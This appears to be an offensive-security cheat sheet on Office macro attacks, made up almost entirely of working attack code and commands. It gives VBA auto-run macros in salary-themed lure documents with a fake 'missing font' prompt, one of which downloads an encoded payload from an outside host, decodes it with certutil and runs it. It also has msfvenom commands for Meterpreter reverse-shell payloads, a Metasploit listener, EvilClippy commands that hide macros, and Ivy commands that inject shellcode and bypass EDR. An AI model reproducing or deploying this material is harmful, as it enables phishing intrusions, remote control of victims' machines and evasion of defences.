# Macro Attack

***

`Macro Attack` is a piece of malicious code written in the same macro language used in everyday applications, such as Microsoft Word, Excel, and Powerpoint. The attack code commonly hides in documents and spreadsheets and is activated as soon as you open the file.

### Macro Support

```cmd
assoc | findstr /i word
assoc | findstr /i  excel
assoc | findstr /i  powerp 
```

### Simple Macro

salary.docx

```powershell
Sub AutoOpen()
    Nooranet
End Sub
Sub Nooranet()
  MsgBox "Download Missing Font Automatic", vbOKOnly, "Missing Font"
  a = Shell("E:\Intial-Access\Macro\screen.cmd", vbHide)
End Sub
```

### Run with com object

salaray-1401.xslm

```powershell
Sub Auto_Open()
    DownloadAndExec
End Sub
Sub DownloadAndExec()
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://nooranetred.com/edr.cert", False
xHttp.Send
With bStrm
.Type = 1 '//binary
.Open
.write xHttp.responseBody
.savetofile "edr.cert", 2 '//overwrite
End With
Shell ("cmd /c certutil -decode edr.cert edr.hta & start edr.hta")
End Sub
```

## Tips :

#### edr.hta

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f hta-psh > /var/www/html/cert.hta 
```

##### Encode as byte

 edr.cert

 encode-base64.ps1

```powershell
$raw = Get-Content -path edr.hta -Encoding Byte
$b64 =[system.Convert]::TOBase64String($raw)
$b64  | Out-File E:\Initial-Access\Macro\edr.cert
```

#### Listener

```bash
msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
```

### Evil Clippy

A cross-platform assistant for creating malicious MS Office documents. 
Can hide VBA macros, stomp VBA code (via P-Code) and confuse macro 
analysis tools. Runs on Linux, OSX and Windows.

Evil Clippy uses the [OpenMCDF library](https://github.com/ironfede/openmcdf/) to manipulate MS Office Compound File Binary Format (CFBF) files

https://github.com/outflanknl/EvilClippy

##### Hidden macro

```
Evilclippy.exe -g  secret-salary.xlsm
```

```
Evilclippy.exe -gg  secret-salary.xlsm
```

##### Lock Protection

```
Evilclippy.exe -u secret-salary.xlsm
```

```
Evilclippy.exe -uu secret-salary.xlsm
```

### IVY

`Ivy` is a payload creation framework for the execution of arbitrary VBA 
(macro) source code in memory. Ivy’s loader does this by abusing 
programmatical access in the VBA object environment to load, decrypt, 
and execute shellcode

https://github.com/optiv/Ivy

* staged

        vba shellcode    

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f vbs -o /var/www/html/shell.vbs    
```

* stagedless

        raw shell code

```bashscript
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443  -f raw > shell.bin
```

#### Staged Inject payload

```
Ivy -Ix86 shell.vbs  -P Inject -O SampleInject.js
```

#### Stageless Inject payload

```
Ivy -stageless -Ix86 shell.bin -P Local -O stageless.js
```

#### One liner commander

```
Ivy --Ix86 shell.bin -P Inject -O test.png -stageless
```

```
cscript //E:jscript test.png
```

#### bypass EDR

```visual-basic
./Ivy -stageless -Ix86 shell.vbs -P Inject -unhook -O stageless.js
```